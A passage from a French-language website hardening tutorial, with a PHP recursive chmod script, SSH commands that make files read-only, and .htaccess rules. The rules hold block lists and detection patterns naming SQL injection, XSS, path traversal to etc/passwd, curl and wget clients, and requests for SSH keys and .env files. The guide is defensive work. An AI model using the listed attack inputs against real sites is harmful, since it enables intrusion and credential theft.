    <span style="color: #008000; font-weight: bold">print</span> <span style="color: #BA2121">&quot;&lt;td&gt;&lt;select name=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">fic1</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;&lt;option value=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">4</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;4&lt;/option&gt;&lt;option value=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">6</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121"> selected&gt;6&lt;/option&gt;&lt;/select&gt;&lt;select name=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">fic2</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;&lt;option value=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">0</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;0&lt;/option&gt;&lt;option value=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">4</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121"> selected&gt;4&lt;/option&gt;&lt;option value=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">6</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;6&lt;/option&gt;&lt;/select&gt;&lt;select name=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">fic3</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;&lt;option value=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">0</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;0&lt;/option&gt;&lt;option value=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">4</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121"> selected&gt;4&lt;/option&gt;&lt;option value=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">6</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;6&lt;/option&gt;&lt;/select&gt;&lt;/td&gt;&lt;/tr&gt;&quot;</span>;
    <span style="color: #008000; font-weight: bold">print</span> <span style="color: #BA2121">&quot;&lt;tr&gt;&lt;td&gt;R&amp;eacute;pertoire &amp;agrave; contr&amp;ocirc;ler: &lt;/td&gt;&quot;</span>;
    <span style="color: #008000; font-weight: bold">print</span> <span style="color: #BA2121">&quot;&lt;td&gt;&quot;</span><span style="color: #666666">.</span>ABSPATH<span style="color: #666666">.</span><span style="color: #BA2121">&quot; &lt;input type=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">text</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121"> name=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">chemin</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121"> maxlength=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">80</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121"> size=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">30</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121"> value=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">/</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121"> &gt;&lt;/td&gt;&lt;/tr&gt;&quot;</span>;
    <span style="color: #008000; font-weight: bold">print</span> <span style="color: #BA2121">&quot;&lt;tr&gt;&lt;td&gt; &lt;/td&gt;&lt;td&gt;&lt;strong style=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">color:red</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;ATTENTION: LES MODIFICATIONS INCLUENT &lt;br&gt;LES DOSSIERS ENFANTS ET LEURS FICHIERS.&lt;/strong&gt;&lt;/td&gt;&lt;/tr&gt;&quot;</span>;
    <span style="color: #008000; font-weight: bold">print</span> <span style="color: #BA2121">&quot;&lt;tr&gt;&lt;td&gt; &lt;/td&gt;&lt;td&gt;&lt;input type=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">submit</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121"> value=</span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121"> Changer les CHMOD des Dossiers et Fichiers </span><span style="color: #BB6622; font-weight: bold">\&quot;</span><span style="color: #BA2121">&gt;&quot;</span>;
    <span style="color: #008000; font-weight: bold">print</span> <span style="color: #BA2121">&quot;&lt;/form&gt;&quot;</span>;
    <span style="color: #008000; font-weight: bold">print</span> <span style="color: #BA2121">&quot;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&quot;</span>;

<span style="color: #008000; font-weight: bold">if</span> ( (<span style="color: #19177C">$dosPerm</span><span style="color: #666666">||</span><span style="color: #19177C">$ficPerm</span>) <span style="color: #666666">&gt;</span> <span style="color: #666666">0</span> ){

    <span style="color: #008000; font-weight: bold">function</span> <span style="color: #0000FF">rChmod</span>(<span style="color: #19177C">$chem</span>,<span style="color: #19177C">$dosPerm</span>,<span style="color: #19177C">$ficPerm</span>) {
        <span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&quot;&lt;p&gt;&lt;b&gt;Journal:&lt;/b&gt;&lt;/p&gt;</span><span style="color: #BB6622; font-weight: bold">\r\n</span><span style="color: #BA2121">&quot;</span>;

        <span style="color: #19177C">$d</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">new</span> RecursiveDirectoryIterator(<span style="color: #19177C">$chem</span>);
        <span style="color: #19177C">$d</span> <span style="color: #666666">-&gt;</span><span style="color: #7D9029">setFlags</span>(RecursiveDirectoryIterator<span style="color: #666666">::</span><span style="color: #7D9029">SKIP_DOTS</span>);
        <span style="color: #008000; font-weight: bold">foreach</span> (<span style="color: #008000; font-weight: bold">new</span> RecursiveIteratorIterator(<span style="color: #19177C">$d</span>, <span style="color: #666666">1</span>) <span style="color: #008000; font-weight: bold">as</span> <span style="color: #19177C">$path</span>) {
            <span style="color: #19177C">$chmodret</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">false</span>;
            <span style="color: #19177C">$chmodresultat</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;&quot;</span>;
            <span style="color: #008000; font-weight: bold">if</span> ( <span style="color: #19177C">$path</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">isDir</span>() ) {
            <span style="color: #19177C">$chmodret</span> <span style="color: #666666">=</span> <span style="color: #008000">chmod</span>( <span style="color: #19177C">$path</span>, <span style="color: #19177C">$dosPerm</span> ); }
            <span style="color: #008000; font-weight: bold">else</span> {
            <span style="color: #008000; font-weight: bold">if</span> ( <span style="color: #008000">is_file</span>( <span style="color: #19177C">$path</span> )  ) {
            <span style="color: #19177C">$chmodret</span> <span style="color: #666666">=</span> <span style="color: #008000">chmod</span>( <span style="color: #19177C">$path</span>, <span style="color: #19177C">$ficPerm</span> ); }
            }
            <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #19177C">$chmodret</span>) {<span style="color: #19177C">$chmodresultat</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;OK&quot;</span>; }
            <span style="color: #008000; font-weight: bold">else</span> {
                <span style="color: #19177C">$chmodresultat</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;ERREUR&quot;</span>;
                <span style="color: #666666">++</span><span style="color: #19177C">$retval</span>;
                }
            <span style="color: #008000; font-weight: bold">echo</span> <span style="color: #19177C">$chmodresultat</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&quot; &quot;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$path</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;&lt;br /&gt;</span><span style="color: #BB6622; font-weight: bold">\r\n</span><span style="color: #BA2121">&quot;</span>;
        }
    <span style="color: #008000; font-weight: bold">return</span> <span style="color: #19177C">$retval</span>;
    }
    <span style="color: #19177C">$nbfailed</span> <span style="color: #666666">=</span> rChmod(<span style="color: #19177C">$chem</span>,<span style="color: #19177C">$dosPerm</span>,<span style="color: #19177C">$ficPerm</span>);
    <span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&quot;&lt;p&gt;&lt;b&gt;&quot;</span>;
    <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #19177C">$nbfailed</span> <span style="color: #666666">&gt;</span> <span style="color: #666666">0</span>) {
        <span style="color: #008000; font-weight: bold">echo</span> <span style="color: #19177C">$nbfailed</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&quot; erreur(s) CHMOD. Voyez le journal ci-dessus.&quot;</span>;
        }
    <span style="color: #008000; font-weight: bold">else</span> <span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&quot;Pas d&#39;erreur apparente. Vérifiez par vous-même.&lt;/b&gt; Supprimez le fichier après utilisation.&lt;/p&gt;</span><span style="color: #BB6622; font-weight: bold">\r\n</span><span style="color: #BA2121">&quot;</span>;
}
    <span style="color: #008000; font-weight: bold">print</span> <span style="color: #BA2121">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>;
<span style="color: #BC7A00">?&gt;</span>
</pre></div>
						<p>Il est possible d'accélérer le changement des droits par SSH en automatisant cette action. Votre hébergeur doit vous donner accès à une connexion SSH.<br>
						Avec un script qui fait du <a href="http://sourceforge.net/projects/shcmd/">pseudo-ssh en PHP</a>, mettez le fichier dans le dossier "www" ou "public_html" et commencez le travail.<br>
						Changer tous les droits par FTP de tous les fichiers et dossiers peut être long et fastidieux avec le risque d'en oublier. J'utilise les lignes de commandes ci-dessous pour changer les droits rapidement par SSH.</p>
						<p>Connectez-vous en SSH à votre compte, puis placez-vous dans le dossier “www” (ou “public_html”) en entrant la commande cd www , et entrez les commandes suivantes en une seule ligne (après avoir modifié les noms des fichiers et dossiers selon les besoins)&nbsp;:<br>
						En mode SSH, mettez-vous dans le dossier "www" ou "public_html" avant de commencer.<br>
						On copie une ligne, on appuie sur la touche Entrée, et on copie une autre ligne, on appuie sur la touche Entrée, etc. après avoir modifié les noms des fichiers et dossiers selon les besoins.</p>
						<p>Tous les fichiers ont les droits 404 ou 444 (<em>droit de lecture, aucun droit d'écriture</em>)&nbsp;:</p>
<span class="smallfont">Code&nbsp;:</span>
<pre class="smallfont code">find . -type f -print0 | xargs -0 chmod 404</pre>
<p>Tous les dossiers ont les droits 505 ou 555 (<em>droit de lecture, aucun droit d'écriture</em>)&nbsp;:</p>
<span class="smallfont">Code&nbsp;:</span>
<pre class="smallfont code">find . -type d -print0 | xargs -0 chmod 505</pre>
<p>Tous les fichiers portant le nom “.htaccess” ont les droits 404 ou 444 (<em>droit de lecture, aucun droit d'écriture</em>)&nbsp;:</p>
<span class="smallfont">Code&nbsp;:</span>
<pre class="smallfont code">find . -type f -name .htaccess -print0 | xargs -0 chmod 404</pre>
<p>Tous les fichiers contenant le nom “config*.php” (utilisation du caractère joker *) du dossier “blog” ont les droits 404 (<em>droit de lecture, aucun droit d'écriture</em>)&nbsp;:</p>
<span class="smallfont">Code&nbsp;:</span>
<pre class="smallfont code">find /home/loginftp/www/blog -type f -name &quot;config*.php&quot; -print0 | xargs -0 chmod 404</pre>
<p>Tous les fichiers php (“*.php” utilisation du caractère joker *) ont les droits 404 ou 444 (<em>droit de lecture, aucun droit d'écriture</em>)&nbsp;:</p>
<span class="smallfont">Code&nbsp;:</span>
<pre class="smallfont code">find . -type f -name &quot;*.php&quot; -print0 | xargs -0 chmod 404</pre>
<p>Tous les dossiers portant le nom “dossier_a_verrouiller” ont les droits 505 ou 555 (<em>droit de lecture, aucun droit d'écriture</em>)&nbsp;:</p> 
<span class="smallfont">Code&nbsp;:</span>
<pre class="smallfont code">find . -type d -name dossier_a_verrouiller -print0 | xargs -0 chmod 505</pre>
<p>Tous les dossiers comportant le mot upload, comme “123-upload” ou “uploadbidule” (“*upload*” utilisation du caractère joker *) qui se trouvent dans le dossier “forum” ont les droits 705 (<em>droit de lecture et droit d'écriture pour vous et le serveur</em>)&nbsp;:</p>
<span class="smallfont">Code&nbsp;:</span>
<pre class="smallfont code">find /home/loginftp/www/forum -type d -name &quot;*upload*&quot; -print0 | xargs -0 chmod 705</pre>
<p><a href="https://fr.wikipedia.org/wiki/Chmod">Un article sur la signification du CHMOD et la signification des numéros.</a></p>
						<a id="htaccess"></a><hr><br>
						<header>
							<h2>Le fichier .htaccess</h2>
						</header>
						<p>Je vous propose 9 astuces pour sécuriser votre site web. Elles sont très efficaces et permettent de stopper beaucoup de tentatives de piratages <strong>avant</strong> que votre CMS, blog ou e-commerce entre en action. Donc, dans une certaine mesure, si votre logiciel a une faille, peut-être que ces règles éviteront qu'elle ne soit exploitée. N'installez pas ces règles en une fois, suivez les conseils d'installations et de tests après la 9e astuce. <strong>Appliquez au moins les règles 3, 4, 5 et 6 qui sont très efficaces</strong>, elles vous protégerons de 90% des attaques automatiques tout en ayant peu de risque de bloquer votre site internet.</p>
						<p>Créez le fichier .htaccess avec un logiciel de texte simple (tout sauf Word). Appelez-le “txt.htaccess”, envoyez-le par FTP dans votre dossier www et renommez-le en “.htaccess”. Si le fichier existe déjà, ajoutez les règles décrites ci-après à la suite du texte. Puis donnez-lui par FTP les droits 404 ou 444. Il ne sera pas modifiable.</p>
						<p>Voici une suite de commandes qui permettent de sécuriser votre site web.</p>
						<p><strong>1-</strong> Interdire l'accès à ce fichier depuis un navigateur web&nbsp;:</p>
<span class="smallfont">Code&nbsp;:</span>
<!-- HTML generated using hilite.me --><div class="smallfont code" style="overflow:auto;width:auto;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #008000; font-weight: bold">&lt;Files</span> <span style="color: #BA2121">.htaccess</span><span style="color: #008000; font-weight: bold">&gt;</span>
<span style="color: #008000">order</span> allow,deny
<span style="color: #008000">deny</span> from <span style="color: #008000; font-weight: bold">all</span>
<span style="color: #008000; font-weight: bold">&lt;/Files&gt;</span>
</pre></div>
						<p><strong>2-</strong> Interdire de lister le contenu d'un dossier&nbsp;:</p>
<span class="smallfont">Code&nbsp;:</span>
<!-- HTML generated using hilite.me --><div class="smallfont code" style="overflow:auto;width:auto;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #008000">Options</span> -Indexes
</pre></div>
						<p><strong>3-</strong> On bloque toute une série de failles potentielles. La plupart des pirates utilisent ces moyens pour tester la faiblesse de votre site. Là, on les bloque avant qu'il ne pénètre votre CMS, blog ou e-commerce. <strong class="vert">-= TRÈS EFFICACE ET INDISPENSABLE =-</strong></p>
<span class="smallfont">Code&nbsp;:</span>
<!-- HTML generated using hilite.me --><div class="smallfont code" style="overflow:auto;width:auto;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #408080; font-style: italic">### FILTRE CONTRE XSS, REDIRECTIONS HTTP, base64_encode, VARIABLE PHP GLOBALS VIA URL, MODIFIER VARIABLE _REQUEST VIA URL, TEST DE FAILLE PHP, INJECTION SQL SIMPLE</span>
<span style="color: #008000">RewriteEngine</span> <span style="color: #008000; font-weight: bold">On</span>
<span style="color: #008000">RewriteCond</span> %{REQUEST_METHOD} (GET|POST) [NC]
<span style="color: #008000">RewriteCond</span> %{QUERY_STRING} ^(.*)(%3C|&lt;)/?(no)?script(.*)$ [NC,OR]
<span style="color: #008000">RewriteCond</span> %{QUERY_STRING} ^(.*)(%3D|=)?javascript(%3A|:)(.*)$ [NC,OR]
<span style="color: #008000">RewriteCond</span> %{QUERY_STRING} ^(.*)document\.location\.href(.*)$ [OR]
<span style="color: #008000">RewriteCond</span> %{QUERY_STRING} ^.*(%24&amp;x).* [NC,OR]
<span style="color: #008000">RewriteCond</span> %{QUERY_STRING} ^.*(127\.0).* [NC,OR]
<span style="color: #408080; font-style: italic">## ATTENTION À CETTE RÈGLE. ELLE PEUT CASSER CERTAINES REDIRECTIONS RESSEMBLANT À: http://www.truc.fr/index.php?r=http://www.machin.fr</span>
<span style="color: #008000">RewriteCond</span> %{QUERY_STRING} ^(.*)(%3D|=|%2B|\+)(%27|&#39;|%22|\&quot;)?(https?|ftp|mosConfig)(%3A|:)(%2F%2F|//)(.*)$ [NC,OR]
<span style="color: #008000">RewriteCond</span> %{QUERY_STRING} ^.*(_encode|localhost|loopback).* [NC,OR]
<span style="color: #008000">RewriteCond</span> %{QUERY_STRING} ^author=[1-9] [NC,OR] ## recherche page auteur Wordpress pour deviner le login
<span style="color: #008000">RewriteCond</span> %{QUERY_STRING} ^(.*)(GLOBALS|_REQUEST|DOCUMENT_ROOT|_SERVER|_POST)(=|\[|%[0-9A-Z]{0,2})(.*)$ [OR]
<span style="color: #008000">RewriteCond</span> %{QUERY_STRING} ^(.*)(SELECT(%20|\+)|UNION(%20|\+)ALL|INSERT(%20|\+)|DELETE(%20|\+)|CHAR\(|UPDATE(%20|\+)|REPLACE(%20|\+)|LIMIT(%20|\+)|CONCAT(%20|\+)|DECLARE(%20|\+))(.*)$ [NC]
<span style="color: #008000">RewriteRule</span> (.*) - [F]
</pre></div>
						<p><strong>4-</strong> On bloque certaines requêtes bizarres: <strong class="vert">-= TRÈS EFFICACE ET INDISPENSABLE =-</strong></p>
<span class="smallfont">Code&nbsp;:</span>
<!-- HTML generated using hilite.me --><div class="smallfont code" style="overflow:auto;width:auto;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #408080; font-style: italic">### DES FAUX URLS OU VIEUX SYSTEMES OBSOLETES OU URLS PAR DÉFAUT À EVITER, ON LES NEUTRALISE</span>
<span style="color: #008000">RewriteRule</span> &quot;(base64|boot\.ini|eval\(|\(null\)|^[-_a-z0-9/\.]*//.*|etc(%2F|/)passwd|(%3D|=)\.\./\.\./|^_vti.*|^MSOffice.*|fckeditor/|elfinder/|^simpla/|zoho/|jquery-file-upload/server/|/assetmanager/|wwwroot|e107\_|^netcat/|^indy/|^etm/|^static/|^downloader/|trackback|^pma/|phpmyadmin/|^(my?)sql\.|^dump\.|^db\.|^database\.|^backups?\.|^httpdoc\.|^public_html\.|^old[-_]\.|^pack\.|^iismap\.)&quot; - [NC,F]
<span style="color: #408080; font-style: italic">### DÉSACTIVE LES MÉTHODES DE REQUÊTES DELETE, PUT, PATCH DE WEBDAV</span>
<span style="color: #008000">RewriteCond</span> %{REQUEST_METHOD} ^(DELETE|PUT|PATCH) [NC,F]
</pre></div>
						<p><strong>5-</strong> On n'autorise que l'affichage de certains fichiers, et pas les autres. Le fichier index.php est le fichier par défaut. Si on affiche index.htm, ça ne marche pas. L'intérêt est d'interdire au pirate d'afficher sur son navigateur un fichier ou un format de fichier non autorisé. <strong class="vert">-= <u>TRÈS</u> <u>TRÈS</u> <u>TRÈS</u> EFFICACE MAIS À TESTER ET À ADAPTER À VOTRE INSTALLATION =-</strong><br>
						Attention: il faut tester ces interdictions et les adapter au besoin.</p>
<span class="smallfont">Code&nbsp;:</span>
<!-- HTML generated using hilite.me --><div class="smallfont code" style="overflow:auto;width:auto;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #408080; font-style: italic">### SEUL LE FICHIER index.php EST SERVI COMME PREMIER FICHIER PAR DÉFAUT. LES AUTRES SONT INTERDITS</span>
<span style="color: #008000">DirectoryIndex</span> index.php
<span style="color: #008000">RewriteEngine</span> <span style="color: #008000; font-weight: bold">On</span>

<span style="color: #408080; font-style: italic">### INTERDIRE LES AUTRES TYPES DE FICHIER INDEX</span>
<span style="color: #008000">RewriteRule</span> <span style="color: #BA2121">&quot;^(index)\.(p?s?x?htm?|txt|aspx?|cfml?|cgi|pl|php[3-9]|jsp|xml)$&quot;</span> - [NC,F]

<span style="color: #408080; font-style: italic">### INTERDIRE L&#39;AFFICHAGE DE CERTAINS FORMATS DE FICHIER EXÉCUTÉS PAR LE SERVEUR </span>
<span style="color: #408080; font-style: italic">### MAIS INTERDIT D&#39;AFFICHAGE PAR LE NAVIGATEUR WEB</span>
<span style="color: #008000">RewriteRule</span> <span style="color: #BA2121">&quot;(\.(aspx?|backup|bak|bash|bat|bin|bkp|c|cfg|class|cmd|com|conf|config|cvs|cxz|dat|db|dist|dll|dos|env|exe|fla|git|h|hg|inc|ini|jsp|key|lnk|log|mdb|module|mso|old|pass|pdb|pl|pol|printer|psd|pwd|py|rar|resources|sh|spd|sql|svn|sw[op]|sys|theme|tpl|webinfo)|~)$&quot;</span> - [NC,F]

<span style="color: #408080; font-style: italic">### INTERDIRE L&#39;ACCÈS À CERTAINS DOSSIERS PAR LE NAVIGATEUR WEB </span>
<span style="color: #408080; font-style: italic">### MAIS AUTORISÉS ET EXÉCUTÉS PAR LE SERVEUR</span>
<span style="color: #408080; font-style: italic">### À ADAPTER SI CELA POSE PROBLÈME</span>
<span style="color: #008000">RewriteRule</span> <span style="color: #BA2121">&quot;(\.svn|\.git|\.hg|\.bzr|\.env|\.cvs|\.ssh|install?|users?|modules|node|core|config(ure|uration)?|options?|settings?|functions?|setup|[-_a-z0-9.]*cms[-_a-z0-9.]*|[-_a-z0-9.]*php[-_a-z0-9.]*|null|^root|^logs?)/.*&quot;</span> - [NC,F]

<span style="color: #408080; font-style: italic">### INTERDIRE L&#39;AFFICHAGE DE CERTAINS FICHIERS COMME readme, changelog, default, xmlrpc. </span>
<span style="color: #408080; font-style: italic">### CES FICHIERS DONNENT DES INFORMATIONS PRÉCIEUSES SUR LA CONFIGURATION INSTALLÉE (NOM DU SERVEUR ET NUMÉRO DE VERSION). </span>
<span style="color: #408080; font-style: italic">### À ADAPTER SI CELA POSE PROBLÈME</span>
<span style="color: #008000">RewriteRule</span> <span style="color: #BA2121">&quot;(readme|changelog|license|default|home|xmlrpc|local|errors?|debug|hacke?r?d?|php|shell|ssh|roots?|cmd|null|test|data)\.(p?s?x?htm?l?|txt|md|log|aspx?|cfml?|cgi|pl|php[3-9]{0,1}|jsp?|sql|xml)$&quot;</span> - [NC,F]

<span style="color: #408080; font-style: italic">### PROTECTION DES ACCÈS SFTP DE SYNCHRONISATION NON SÉCURISÉS ET NON AUTORISÉS DEPUIS UN NAVIGATEUR WEB</span>
<span style="color: #008000">RewriteRule</span> <span style="color: #BA2121">&quot;\.?(s?ftp|remote|deployment|ws_ftp|winscp|filezilla|webservers)-?(config|sync)?\.(json|settings?|ini|xml)$&quot;</span> - [NC,F]
<span style="color: #008000">RewriteRule</span> <span style="color: #BA2121">&quot;(\.ssh/)?(id_[rdec1259]+sa)$&quot;</span> - [NC,F]

<span style="color: #408080; font-style: italic">### SI VOUS N&#39;UTILISEZ PAS DE CMS, VOUS POUVEZ AJOUTER LE CODE CI-DESSOUS, </span>
<span style="color: #408080; font-style: italic">### OU INSPIREZ-VOUS EN POUR VERROUILLER ENCORE MIEUX VOTRE CMS</span>
<span style="color: #008000">RewriteRule</span> <span style="color: #BA2121">&quot;(install?|users?|upload(er)?|regist(er|ration)|config(\.inc|ure|uration)?|options?(\.inc)?|settings?(\.inc)?|functions?(\.inc)?|setup(\.inc)?)\.(p?s?x?htm?l?|css|txt|md|log|aspx?|cfml?|cgi|pl|php[3-9]{0,1}|jsp?)$&quot;</span> - [NC,F]

<span style="color: #408080; font-style: italic">### INTERDIRE L&#39;ACCÈS AUX INTERFACES D&#39;ADMINISTRATION DE WORDPRESS OU AUTRE CMS</span>
<span style="color: #408080; font-style: italic">### AVEC UN ACCÈS CLASSIQUE PAR DÉFAUT QUI SE DEVINE FACILEMENT COMME login ou wp-login, admin, manager, etc.</span>
<span style="color: #408080; font-style: italic">### OU INSPIREZ-VOUS EN POUR VERROUILLER ENCORE MIEUX VOTRE CMS</span>
<span style="color: #008000">RewriteRule</span> <span style="color: #BA2121">&quot;(wp-?|wordpress|login|(my)?admin(istrator)?(zone)?|blog/|^modules|^manager)&quot;</span> - [NC,F]
</pre></div>
						<p><strong>6-</strong> Empêcher l'exécution de tout script PHP, Perl, CGI dans un dossier. L'option ci-dessous vous permet par exemple de protéger un dossier d'upload ou tout dossier très sensible dont vous voulez renforcer la sécurité. Il ne faut pas utiliser cette option dans le fichier .htaccess avec tous les codes décrits ci-dessus. Je vous invite plutôt à créer un fichier .htaccess et à le mettre dans le dossier à protéger. Cette option empêche un navigateur web d'exécuter le script directement. Mais si le navigateur ouvre le fichier index.php qui fait un include() vers un fichier php se trouvant dans le dossier protégé par le code ci-dessous, tout s'exécutera bien. On protège donc l'exécution directe du fichier par un navigateur quand le pirate essaye d'entrer du code malicieux non filtré. <strong class="vert">-= TRÈS EFFICACE ET INDISPENSABLE =-</strong></p>
<span class="smallfont">Code&nbsp;:</span>
<!-- HTML generated using hilite.me --><div class="smallfont code" style="overflow:auto;width:auto;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #408080; font-style: italic">### Aucun script dans le dossier et ses sous-dossiers, que ce soit PHP, PERL ou autre CGI, ne pourra s&#39;executer si ExecCGI est inactif. Et il est interdit d&#39;afficher la liste des fichiers.</span>
<span style="color: #008000">OPTIONS</span> -ExecCGI  -Indexes
</pre></div>
						<p><strong>7-</strong> Exclure les logiciels suspects utilisés par les pirates et certains aspirateurs de site web. Appliquez cette règle sans trop de risque, car on bloque certaines attaques automatiques. Cette liste est le minimum. Vous pouvez en ajouter d'autres si vous en trouvez. Cependant, elle n'est plus aussi efficace qu'avant, car maintenant tous les robots pirates utilisent des fausses déclarations. On bloque ici les plus idiots.</p>
<span class="smallfont">Code&nbsp;:</span>
<!-- HTML generated using hilite.me --><div class="smallfont code" style="overflow:auto;width:auto;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #408080; font-style: italic">### FILTRE CONTRE CERTAINS ROBOTS DES PIRATES</span>
<span style="color: #008000">RewriteEngine</span> <span style="color: #008000; font-weight: bold">On</span>
<span style="color: #408080; font-style: italic">## EXCEPTION: TOUS LES ROBOTS MÊMES ANONYMES OU BANNIS PEUVENT ACCÉDER À CES FICHIERS</span>
<span style="color: #008000">RewriteCond</span> %{REQUEST_URI} !^robots.txt
<span style="color: #008000">RewriteCond</span> %{REQUEST_URI} !^sitemap.xml
<span style="color: #408080; font-style: italic">## ANONYMES</span>
<span style="color: #008000">RewriteCond</span> %{HTTP_USER_AGENT} ^-?$ [OR]
<span style="color: #408080; font-style: italic">## BIBLIOTHÈQUES / CLASSES HTTP DONT ON NE VEUT PAS. ATTENTION, CELA PEUT BLOQUER CERTAINES FONCTIONS DE VOTRE CMS. NE PAS TOUT EFFACER, MAIS CHERCHEZ LE NOM DE LA CLASSE HTTP CONCERNÉE (DEMANDEZ AUX DÉVELOPPEURS DE VOTRE CMS). CETTE LISTE BLOQUE 80% DES ROBOTS SPAMMEURS. IL FAUT LA CONSERVER.</span>
<span style="color: #008000">RewriteCond</span> %{HTTP_USER_AGENT} ^curl|^Fetch\ API\ Request|GT::WWW|^HTTP::Lite|httplib|^Java|^LeechFTP|lwp-trivial|^LWP|libWeb|libwww|^PEAR|PECL::HTTP|PHPCrawl|PycURL|^ReGet|Rsync|Snoopy|URI::Fetch|urllib|WebDAV|^Wget|^AnyConnect|Nmap\ Scripting [NC]
<span style="color: #408080; font-style: italic">## CEUX QUI INVENTENT DES NOMS AU HASARD, RETIREZ LES 2 DIÈSES EN DÉBUT DE LIGNE POUR L&#39;ACTIVER</span>
<span style="color: #408080; font-style: italic">## RewriteCond %{HTTP_USER_AGENT} ^[bcdfghjklmnpqrstvwxz\ ]{10,}|^[0-9a-z]{15,}|^[0-9A-Za-z]{19,}|^[A-Za-z]{3,}\ [a-z]{4,}\ [a-z]{4,} [OR]</span>
<span style="color: #008000">RewriteRule</span> (.*) [F]
</pre></div>
						<p><strong>8-</strong> Interdiction du hotlinking. Remplacez <em>mondomaine</em> par votre nom de domaine, et <em>\.fr</em> par fr, com, net, org ou autres extensions en gardant le \ avant le point.</p>
<span class="smallfont">Code&nbsp;:</span>
<!-- HTML generated using hilite.me --><div class="smallfont code" style="overflow:auto;width:auto;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #408080; font-style: italic">### ON ÉVITE LE VOL D&#39;IMAGES, VIDÉO, SON, FEUILLE DE STYLE, PDF ET ZIP</span>
<span style="color: #408080; font-style: italic">### LES VISITEURS DOIVENT PASSER PAR LE SITE. </span>
<span style="color: #008000">RewriteEngine</span> <span style="color: #008000; font-weight: bold">on</span> 
<span style="color: #008000">RewriteCond</span> %{HTTP_REFERER} !^$ 
<span style="color: #008000">RewriteCond</span> %{HTTP_REFERER} !^https?://[-a-z0-9.]*mondomaine\.fr$ [NC] 
<span style="color: #008000">RewriteCond</span> %{HTTP_REFERER} !^https?://[-a-z0-9.]*mondomaine\.fr/.*$ [NC] 
<span style="color: #408080; font-style: italic">## CES DOMAINES PEUVENT AFFICHER LES ÉLÉMENTS DU SITE</span>
<span style="color: #008000">RewriteCond</span> %{HTTP_REFERER} !^https?://.*(translate|paypal|google|bing|yahoo|yandex|baidu|facebook|qwant|duck|ixquick|pinterest|twitter).*$ [NC]
<span style="color: #408080; font-style: italic">## LES CONNEXIONS À TRAVERS LES APP DES MOBILES PEUVENT AFFICHER LES ÉLÉMENTS DU SITE</span>
<span style="color: #008000">RewriteCond</span> %{HTTP_REFERER} !^mobile?://.*$ [NC]
